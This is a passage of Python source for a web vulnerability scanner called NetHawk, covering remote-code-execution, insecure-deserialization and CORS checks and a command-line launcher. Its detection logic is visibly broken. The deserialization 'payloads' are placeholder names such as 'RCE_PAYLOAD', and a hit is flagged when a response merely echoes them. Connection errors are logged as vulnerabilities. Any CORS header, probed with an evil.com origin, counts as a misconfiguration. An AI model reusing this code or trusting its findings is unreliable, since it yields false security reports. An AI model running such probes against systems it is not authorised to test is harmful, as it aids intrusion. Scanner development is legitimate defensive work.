                                    'payload': payload,
                                    'evidence': f"Response contains indicator: {indicator}",
                                    'severity': 'Critical'
                                }
                                self.vulnerabilities.append(vulnerability)
                                
                                if self.verbose:
                                    print(Fore.RED + f"  [!] RCE vulnerability found at {url}" + Style.RESET_ALL)
                                    print(Fore.RED + f"      Parameter: {input_field.get('name', '')}" + Style.RESET_ALL)
                                    print(Fore.RED + f"      Payload: {payload}" + Style.RESET_ALL)
                                    print(Fore.RED + f"      Evidence: Response contains indicator: {indicator}" + Style.RESET_ALL)
                                break
                    
                    except requests.Timeout:
                        # Timeout could indicate command execution (especially with sleep payloads)
                        vulnerability = {
                            'type': 'Remote Code Execution (RCE)',
                            'url': url,
                            'method': method.upper(),
                            'parameter': input_field.get('name', ''),
                            'payload': payload,
                            'evidence': 'Request timed out (potential blind command execution)',
                            'severity': 'Critical'
                        }
                        self.vulnerabilities.append(vulnerability)
                        
                        if self.verbose:
                            print(Fore.RED + f"  [!] Potential RCE vulnerability found at {url}" + Style.RESET_ALL)
                            print(Fore.RED + f"      Parameter: {input_field.get('name', '')}" + Style.RESET_ALL)
                            print(Fore.RED + f"      Payload: {payload}" + Style.RESET_ALL)
                            print(Fore.RED + f"      Evidence: Request timed out (potential blind command execution)" + Style.RESET_ALL)
                    
                    except Exception as e:
                        if self.verbose:
                            print(Fore.YELLOW + f"  [!] Error testing {url}: {str(e)}" + Style.RESET_ALL)
        
        # Test each form for RCE vulnerabilities
        rce_count = len(self.vulnerabilities)
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            list(executor.map(test_form, self.forms))
        
        # Count how many RCE vulnerabilities were found
        rce_vulnerabilities = sum(1 for v in self.vulnerabilities if v.get('type') == 'Remote Code Execution (RCE)')
        rce_vulnerabilities_found = rce_vulnerabilities - rce_count
        
        print(Fore.GREEN + f"[+] Completed RCE testing, found {rce_vulnerabilities_found} vulnerabilities" + Style.RESET_ALL)
        return rce_vulnerabilities_found

    def test_insecure_deserialization(self):
        """Test for insecure deserialization vulnerabilities"""
        insecure_deserialization_vulnerabilities = []
        
        # Insecure deserialization payloads
        deserialization_payloads = [
            'RCE_PAYLOAD',
            'Deserialization_Exploit',
            'Java_Deserialization_Exploit',
            'Python_Deserialization_Exploit',
            'PHP_Deserialization_Exploit',
            'Ruby_Deserialization_Exploit',
            'Node.js_Deserialization_Exploit',
            'CVE_2023_25194_Exploit',
            'CVE_2023_25195_Exploit',
            'CVE_2023_25196_Exploit'
        ]
        
        # Look for potential deserialization endpoints
        potential_deserialization_endpoints = []
        
        # Check API endpoints first
        for endpoint in self.api_endpoints:
            # Test deserialization endpoints
            if 'application/json' in endpoint.get('content_type', '').lower():
                potential_deserialization_endpoints.append({
                    'url': endpoint.get('url'),
                    'method': 'POST',
                    'content_type': 'application/json'
                })
                
        # Check for URLs that might accept deserialization
        for url in self.discovered_urls:
            if any(hint in url.lower() for hint in ['/deserialization', '/deserialize', '/unserialize', '/json_deserialize']):
                potential_deserialization_endpoints.append({
                    'url': url,
                    'method': 'POST',
                    'content_type': 'application/json'
                })
                
        if not potential_deserialization_endpoints:
            print(Fore.YELLOW + "[!] No potential deserialization endpoints found" + Style.RESET_ALL)
            return insecure_deserialization_vulnerabilities
            
        print(Fore.YELLOW + f"[*] Testing {len(potential_deserialization_endpoints)} potential deserialization endpoints..." + Style.RESET_ALL)
        
        # Test each deserialization endpoint
        for endpoint in potential_deserialization_endpoints:
            for payload in deserialization_payloads:
                headers = {
                    'Content-Type': endpoint.get('content_type', 'application/json'),
                    'Accept': '*/*'
                }
                
                try:
                    if endpoint.get('method') == 'POST':
                        response = self.session.post(endpoint.get('url'), data=payload, headers=headers, timeout=self.timeout)
                    else:
                        response = self.session.get(endpoint.get('url'), headers=headers, timeout=self.timeout)
                        
                    # Check for indicators of successful deserialization
                    for indicator in deserialization_payloads:
                        if indicator in response.text:
                            insecure_deserialization_vulnerabilities.append({
                                'type': 'Insecure Deserialization',
                                'url': endpoint.get('url'),
                                'method': endpoint.get('method'),
                                'payload': payload,
                                'indicator': indicator,
                                'confidence': 'High',
                                'details': f"Endpoint seems vulnerable to insecure deserialization, response contains '{indicator}'"
                            })
                            print(Fore.RED + f"[!] Insecure deserialization vulnerability found at {endpoint.get('url')}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Indicator: {indicator}" + Style.RESET_ALL)
                            break
                except Exception as e:
                    # Some exceptions might indicate a partial success of the deserialization
                    if "No route to host" in str(e) or "Connection refused" in str(e):
                        insecure_deserialization_vulnerabilities.append({
                            'type': 'Insecure Deserialization',
                            'url': endpoint.get('url'),
                            'method': endpoint.get('method'),
                            'payload': payload,
                            'indicator': "Connection error",
                            'confidence': 'Medium',
                            'details': f"Potential deserialization vulnerability: {str(e)}"
                        })
                        print(Fore.RED + f"[!] Potential deserialization vulnerability at {endpoint.get('url')}" + Style.RESET_ALL)
                        print(Fore.YELLOW + f"    Error: {str(e)}" + Style.RESET_ALL)
                    pass
        
        self.vulnerabilities.extend(insecure_deserialization_vulnerabilities)
        return insecure_deserialization_vulnerabilities

    def test_cors_misconfig(self):
        """Test for CORS misconfigurations"""
        cors_vulnerabilities = []
        
        # CORS payloads
        cors_payloads = [
            'Access-Control-Allow-Origin: *',
            'Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS',
            'Access-Control-Allow-Headers: Content-Type, Authorization',
            'Access-Control-Max-Age: 1728000',
            'Access-Control-Allow-Credentials: true'
        ]
        
        # Look for potential CORS endpoints
        potential_cors_endpoints = []
        
        # Check API endpoints first
        for endpoint in self.api_endpoints:
            # Test CORS endpoints
            if 'Access-Control-Allow-Origin' in endpoint.get('headers', {}):
                potential_cors_endpoints.append({
                    'url': endpoint.get('url'),
                    'method': endpoint.get('method'),
                    'headers': endpoint.get('headers')
                })
                
        # Check for URLs that might accept CORS
        for url in self.discovered_urls:
            if any(hint in url.lower() for hint in ['/cors', '/cors-policy', '/cors-configuration']):
                potential_cors_endpoints.append({
                    'url': url,
                    'method': 'OPTIONS',
                    'headers': {'Access-Control-Request-Method': 'GET, POST, PUT, DELETE, OPTIONS'}
                })
                
        if not potential_cors_endpoints:
            print(Fore.YELLOW + "[!] No potential CORS endpoints found" + Style.RESET_ALL)
            return cors_vulnerabilities
            
        print(Fore.YELLOW + f"[*] Testing {len(potential_cors_endpoints)} potential CORS endpoints..." + Style.RESET_ALL)
        
        # Test each CORS endpoint
        for endpoint in potential_cors_endpoints:
            for payload in cors_payloads:
                headers = endpoint.get('headers', {})
                headers.update({
                    'Access-Control-Request-Method': 'GET, POST, PUT, DELETE, OPTIONS',
                    'Origin': 'https://evil.com'
                })
                
                try:
                    if endpoint.get('method') == 'OPTIONS':
                        response = self.session.options(endpoint.get('url'), headers=headers, timeout=self.timeout)
                        if 'Access-Control-Allow-Origin' in response.headers:
                            cors_vulnerabilities.append({
                                'type': 'CORS Misconfiguration',
                                'url': endpoint.get('url'),
                                'method': endpoint.get('method'),
                                'headers': endpoint.get('headers'),
                                'payload': payload,
                                'confidence': 'High',
                                'details': f"CORS misconfiguration found at {endpoint.get('url')}: {payload}"
                            })
                            print(Fore.RED + f"[!] CORS misconfiguration found at {endpoint.get('url')}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                            break
                except Exception as e:
                    # Some exceptions might indicate a partial success of the CORS misconfiguration
                    if "No route to host" in str(e) or "Connection refused" in str(e):
                        cors_vulnerabilities.append({
                            'type': 'CORS Misconfiguration',
                            'url': endpoint.get('url'),
                            'method': endpoint.get('method'),
                            'headers': endpoint.get('headers'),
                            'payload': payload,
                            'indicator': "Connection error",
                            'confidence': 'Medium',
                            'details': f"Potential CORS misconfiguration: {str(e)}"
                        })
                        print(Fore.RED + f"[!] Potential CORS misconfiguration at {endpoint.get('url')}" + Style.RESET_ALL)
                        print(Fore.YELLOW + f"    Error: {str(e)}" + Style.RESET_ALL)
                    pass
        
        self.vulnerabilities.extend(cors_vulnerabilities)
        return cors_vulnerabilities

def run_web_scanner():
    """Function to run the web scanner from the command line"""
    import argparse
    
    parser = argparse.ArgumentParser(description="NetHawk Web Vulnerability Scanner")
    parser.add_argument('target', help='Target URL to scan')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--timeout', type=int, default=5, help='Request timeout in seconds (default: 5)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('-o', '--output', help='Save report to file')
    
    args = parser.parse_args()
    
    scanner = WebScanner(args.target, args.threads, args.timeout, args.verbose)
    report = scanner.run_scan()
    
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(report, f, indent=4)
        print(Fore.GREEN + f"\n[+] Report saved to {args.output}" + Style.RESET_ALL)

if __name__ == "__main__":
    run_web_scanner() 